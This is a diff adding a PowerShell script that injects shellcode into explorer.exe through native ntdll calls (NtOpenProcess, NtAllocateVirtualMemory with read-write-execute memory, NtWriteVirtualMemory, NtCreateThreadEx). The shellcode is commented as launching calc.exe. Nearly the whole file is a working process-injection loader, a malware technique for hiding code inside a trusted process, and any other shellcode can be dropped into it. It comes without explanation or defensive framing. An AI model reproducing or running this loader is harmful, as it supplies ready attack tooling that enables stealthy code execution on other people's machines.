@@ -1,0 +1,148 @@
+# Define constants
+$PAGE_EXECUTE_READWRITE = 0x40
+$MEM_COMMIT = 0x1000
+$MEM_RESERVE = 0x2000
+$PROCESS_ALL_ACCESS = 0x001F0FFF
+$THREAD_ALL_ACCESS = 0x1FFFFF
+
+# Define structs and NtDll functions in a single Add-Type
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+[StructLayout(LayoutKind.Sequential)]
+public struct CLIENT_ID {
+    public IntPtr UniqueProcess;
+    public IntPtr UniqueThread;
+}
+
+[StructLayout(LayoutKind.Sequential)]
+public struct OBJECT_ATTRIBUTES {
+    public int Length;
+    public IntPtr RootDirectory;
+    public IntPtr ObjectName;
+    public uint Attributes;
+    public IntPtr SecurityDescriptor;
+    public IntPtr SecurityQualityOfService;
+}
+
+public class NtDll {
+    [DllImport("ntdll.dll", SetLastError=true)]
+    public static extern uint NtOpenProcess(
+        ref IntPtr ProcessHandle,
+        uint AccessMask,
+        ref OBJECT_ATTRIBUTES ObjectAttributes,
+        ref CLIENT_ID ClientId);
+
+    [DllImport("ntdll.dll")]
+    public static extern IntPtr NtAllocateVirtualMemory(
+        IntPtr ProcessHandle,
+        ref IntPtr BaseAddress,
+        IntPtr ZeroBits,
+        ref IntPtr RegionSize,
+        uint AllocationType,
+        uint Protect);
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtWriteVirtualMemory(
+        IntPtr ProcessHandle,
+        IntPtr BaseAddress,
+        byte[] Buffer,
+        uint BufferSize,
+        out uint NumberOfBytesWritten);
+
+    [DllImport("ntdll.dll", SetLastError=true)]
+    public static extern uint NtCreateThreadEx(
+        out IntPtr ThreadHandle,
+        uint DesiredAccess,
+        IntPtr ObjectAttributes,
+        IntPtr ProcessHandle,
+        IntPtr StartAddress,
+        IntPtr Parameter,
+        bool CreateSuspended,
+        uint StackZeroBits,
+        uint SizeOfStackCommit,
+        uint SizeOfStackReserve,
+        IntPtr BytesBuffer);
+}
+"@
+
+# Get target process (explorer.exe)
+$targetProcess = Get-Process -Name "explorer" | Select-Object -First 1
+if (-not $targetProcess) {
+    Write-Error "Could not find explorer.exe process"
+    return
+}
+
+# Initialize CLIENT_ID and OBJECT_ATTRIBUTES
+$clientId = New-Object CLIENT_ID
+$clientId.UniqueProcess = [IntPtr] $targetProcess.Id
+$clientId.UniqueThread = [IntPtr]::Zero
+
+$objectAttributes = New-Object OBJECT_ATTRIBUTES
+$objectAttributes.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($objectAttributes)
+
+# Open process
+$processHandle = [IntPtr]::Zero
+$status = [NtDll]::NtOpenProcess([ref]$processHandle, $PROCESS_ALL_ACCESS, [ref]$objectAttributes, [ref]$clientId)
+if ($status -ne 0) {
+    Write-Error "NtOpenProcess failed with status: 0x$($status.ToString('X8'))"
+    return
+}
+
+# Shellcode to execute calc.exe via WinExec
+# This shellcode calls WinExec("cmd.exe /c calc.exe", 0)
+$buf = [byte[]] (
+    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
+    0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
+    0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
+    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
+    0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
+    0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
+    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
+    0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,
+    0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
+    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
+    0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,
+    0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
+    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,
+    0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
+    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
+    0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x6D, 0x64, 0x2E, 0x65,
+    0x78, 0x65, 0x20, 0x2F, 0x63, 0x20, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x00
+)
+
+# Allocate virtual memory
+$baseAddress = [IntPtr]::Zero
+$regionSize = [IntPtr] $buf.Length
+$allocResult = [NtDll]::NtAllocateVirtualMemory($processHandle, [ref]$baseAddress, [IntPtr]::Zero, [ref]$regionSize, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)
+if ($allocResult -ne 0) {
+    Write-Error "NtAllocateVirtualMemory failed with status: 0x$($allocResult.ToString('X8'))"
+    return
+}
+
+# Write shellcode to process memory
+$bytesWritten = 0
+$writeResult = [NtDll]::NtWriteVirtualMemory($processHandle, $baseAddress, $buf, [uint32]$buf.Length, [ref]$bytesWritten)
+if ($writeResult -ne 0) {
+    Write-Error "NtWriteVirtualMemory failed with status: 0x$($writeResult.ToString('X8'))"
+    return
+}
+
+# Get existing thread IDs
+$threadList = @()
+$threadsBefore = (Get-Process -Id $targetProcess.Id).Threads
+foreach ($thread in $threadsBefore) {
+    $threadList += $thread.Id
+}
+
+# Create remote thread
+$threadHandle = [IntPtr]::Zero
+$threadResult = [NtDll]::NtCreateThreadEx([ref]$threadHandle, $THREAD_ALL_ACCESS, [IntPtr]::Zero, $processHandle, $baseAddress, [IntPtr]::Zero, $false, 0, 0, 0, [IntPtr]::Zero)
+if ($threadResult -ne 0) {
+    Write-Error "NtCreateThreadEx failed with status: 0x$($threadResult.ToString('X8'))"
+    return
+}
+
+Write-Output "Shellcode injected and executed successfully. Calculator should launch."
